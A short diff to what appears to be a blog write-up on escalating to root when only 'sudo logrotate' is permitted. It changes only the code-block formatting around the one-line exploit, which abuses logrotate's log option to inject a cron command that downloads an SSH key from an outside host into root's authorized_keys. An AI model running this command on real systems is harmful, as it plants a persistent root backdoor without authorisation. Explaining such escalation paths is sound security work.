@@ -206,8 +206,8 @@ The next time the cronjob runs, our arbitrary code is executed: as root.
 ---
 
 So, to answer the question: with only the `sudo logrotate` command available, can we obtain root? Yep; it's as simple as:
-```bash
-sudo logrotate -l /etc/cron.daily/man-db '2>/dev/null;wget host/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'
+```console?prompt=$,#
+$ sudo logrotate -l /etc/cron.daily/man-db '2>/dev/null;wget host/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'
 ```
 then wait until the cronjob is run, and just ssh in. That's my solution to this problem, anyways.
 
